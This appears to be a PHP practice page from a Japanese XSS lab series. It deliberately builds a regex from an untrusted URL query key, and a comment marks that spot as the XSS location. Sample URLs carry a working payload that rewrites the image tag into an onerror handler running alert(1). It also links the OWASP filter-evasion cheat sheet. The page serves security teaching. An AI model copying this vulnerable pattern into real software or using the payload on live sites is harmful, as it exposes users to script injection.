<a href='/'>戻る</a>
<?php
$url = $_SERVER['REQUEST_URI'];
$query = parse_url($url, PHP_URL_QUERY);
$query = explode('&', $query);
$arr = array();
foreach ( $query as $value ) {
    $a = explode('=', $value);
    $arr[$a[0]] = $a[1]; //key=value
}
?>


<html lang="ja">

<head>
    <meta charset="UTF-8">
    <title></title>
</head>

<body>

<pre style="text-align: left; background-color: lightgray;">
【sample】
http://192.168.99.100:86/sample-b7/?name=sachiko
http://192.168.99.100:86/sample-b7/?name=old_sachiko
※【http://192.168.99.100:86/】はローカルに合わせてください。urlアクセス。

【xx_sample】
<?php echo htmlspecialchars('http://192.168.99.100:86/sample-b7/?name=sachiko&|(.)(.)htt|=$1$2a$2onerror$1alert(1)//'."\n") ?>
<?php echo htmlspecialchars('http://192.168.99.100:86/sample-b7/?|(.)(.)htt|=$1$2a$2onerror$1alert(1)//'."\n") ?>
※読み込めない時のイベントハンドラを使っていることに注意。

【owaspの攻撃】
検知不可

【XSS Locator (Polygot)】
URL:https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
※XSS Locatorで確認出来るかの確認
</pre>

<?php
    $template = '<img width="100px" style="background-color:green;" src="https://sachiko-kame.github.io/images/{{name}}.png">';
    foreach ( $arr as $key => $value ) {
        // https://masatokinugawa.l0.cm/2018/01/regex-domxss.html
        $pattern ='/{{' . $key. '}}/'; 
        $replace = preg_replace($pattern, htmlspecialchars($value), $template);
        echo $replace;  /*XSS発生箇所*/ 
    }
?>

</body>

</html>